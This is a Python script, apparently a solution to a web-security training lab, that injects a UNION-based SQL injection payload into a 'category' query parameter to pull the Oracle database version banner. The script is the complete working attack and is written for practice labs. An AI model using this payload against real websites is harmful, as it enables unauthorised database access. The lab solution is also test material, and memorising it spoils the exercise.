##################################################################################
#
# Author: Ahmed Elqalawii
#
# Date: 15/9/2023
#
# Lab: SQL injection attack, querying the database type and version on Oracle
#
# Steps: 1. Inject payload in the "category" query parameter
#        2. Retrieve database banner in the response
#
##################################################################################

###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########
url = "https://0ac3008204e6429182ff516d001900f0.web-security-academy.net" # change this url to your lab
try:
    # the payload to inject
    payload = "' UNION SELECT banner, null FROM v$version-- -"
    # fetch the page with the injected payload
    inject = requests.get(f"{url}/filter?category=Gifts{payload}")
    print(Fore.WHITE + "1. Injecting payload in the 'category' query parameter.. " + Fore.GREEN + "OK")
    if inject.status_code == 200:
        print(Fore.WHITE + "2. Retrieving database banner in the response.. " + Fore.GREEN + "OK")
        print(
            Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
    else:
        print(Fore.RED + "[!] Failed to inject the payload")
except:
    # this is the place where you should handle the exception
    # I just print a message here for simplicity
    print(Fore.RED + "[!] Failed to inject the payload through exception")
